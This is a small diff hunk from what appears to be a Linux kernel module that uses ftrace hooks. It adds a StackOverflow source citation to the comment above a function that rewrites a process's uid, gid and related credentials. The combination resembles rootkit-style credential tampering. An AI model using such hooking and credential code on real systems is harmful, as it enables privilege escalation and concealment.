@@ -98,7 +98,10 @@ static struct ftrace_hook hooks[] = {
 };
 
 
-/* Execute process in userspace */
+/* 
+Execute process in userspace
+Source: https://stackoverflow.com/questions/62562536/running-a-userspace-process-in-user-mode-with-linux-kernel-call-usermodehelper
+*/
 int alter_uid_gid(uid_t uid, gid_t gid, struct cred *new)
 {
         new->uid = new->euid = new->suid = new->fsuid = KUIDT_INIT(uid);
